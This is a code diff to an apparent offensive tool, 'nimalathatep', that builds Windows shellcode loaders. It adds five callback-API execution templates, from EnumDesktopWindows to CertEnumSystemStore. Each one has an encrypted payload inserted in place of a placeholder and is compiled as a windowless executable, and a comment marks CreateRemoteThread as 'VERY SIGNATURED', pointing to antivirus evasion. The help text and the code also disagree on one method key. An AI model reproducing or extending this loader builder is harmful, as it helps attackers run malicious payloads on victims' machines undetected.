@@ -60,7 +60,11 @@ echo "EnumGeoID [enumgeoid]\n"
 echo "CreateFiber [createfiber]\n"
 echo "CreateRemoteThread [createremotethread] <--VERY SIGNATURED\n"
 echo "CreateThreadpoolWait [reatehreadpoolait]\n"
-
+echo "EnumLanguageGroupLocales [enumlanguageg]\n"
+echo "CryptEnumOIDInfo [cryptenum]\n"
+echo "EnumDisplayMonitors [enumdisplay]\n"
+echo "CertEnumSystemStore [enumsystemstore]\n"
+echo "EnumDesktopWindows [enumdesktop]\n"
 
 
 
@@ -140,7 +144,50 @@ proc main() =
         file_path.writeFile(file_target) 
         discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.exe --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
 
+    elif apiMethod == "enumlanguage": 
+        let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim"
+        var file_target = file_path.readFile()
+        let placeholder = "REPLACE_ME"
+        let replacement =  encodedCrypted
+        file_target = file_target.replace(placeholder, replacement)
+        file_path.writeFile(file_target) 
+        discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.exe --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
 
+    elif apiMethod == "cryptenum": 
+        let file_path = ".\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim"
+        var file_target = file_path.readFile()
+        let placeholder = "REPLACE_ME"
+        let replacement =  encodedCrypted
+        file_target = file_target.replace(placeholder, replacement)
+        file_path.writeFile(file_target) 
+        discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.exe --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
+
+    elif apiMethod == "enumdisplay": 
+        let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim"
+        var file_target = file_path.readFile()
+        let placeholder = "REPLACE_ME"
+        let replacement =  encodedCrypted
+        file_target = file_target.replace(placeholder, replacement)
+        file_path.writeFile(file_target) 
+        discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.exe --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
+
+    elif apiMethod == "enumsystemstore": 
+        let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim"
+        var file_target = file_path.readFile()
+        let placeholder = "REPLACE_ME"
+        let replacement =  encodedCrypted
+        file_target = file_target.replace(placeholder, replacement)
+        file_path.writeFile(file_target) 
+        discard execShellCmd("nim -d:release --out:CertEnumSystemStore.exe --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
+
+    elif apiMethod == "enumdesktop": 
+        let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim"
+        var file_target = file_path.readFile()
+        let placeholder = "REPLACE_ME"
+        let replacement =  encodedCrypted
+        file_target = file_target.replace(placeholder, replacement)
+        file_path.writeFile(file_target) 
+        discard execShellCmd("nim -d:release --out:EnumDesktopWindows.exe --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
 
     #elif    
     else:
@@ -154,9 +201,7 @@ proc main() =
 #catch all
 when defined(windows):
     if 1>0:
-        if paramCount() > 2:
-            main()
-        elif paramCount() < 4:
+        if paramCount() == 2:
             main()
         else: 
             echo "Usage: \n nimalathatep.exe <apiMethod> <binFile> \n\n\n\n"
